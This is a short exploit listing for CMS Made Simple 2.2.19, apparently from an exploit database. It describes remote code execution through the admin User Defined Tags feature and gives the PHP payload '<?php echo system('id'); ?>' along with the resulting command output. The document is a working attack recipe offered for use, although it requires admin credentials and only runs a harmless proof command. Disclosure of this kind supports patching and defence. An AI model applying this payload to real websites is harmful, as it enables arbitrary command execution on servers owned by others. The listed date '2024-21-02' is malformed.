# Exploit Title: CMS Made Simple Version: 2.2.19 - Remote Code Execution
# Date: 2024-21-02
# Exploit Author: tmrswrr
# Vendor Homepage: https://www.cmsmadesimple.org/
# Version: 2.2.19
# Tested on: https://www.softaculous.com/demos/CMS_Made_Simple


1 ) log in as admin and go to Extensions > User Defined Tags >
2 ) Write in Code place payload > <?php echo system('id'); ?>
3 ) After click run you will be see result :
uid=1000(admin) gid=1000(admin) groups=1000(admin) uid=1000(admin) gid=1000(admin) groups=1000(admin)
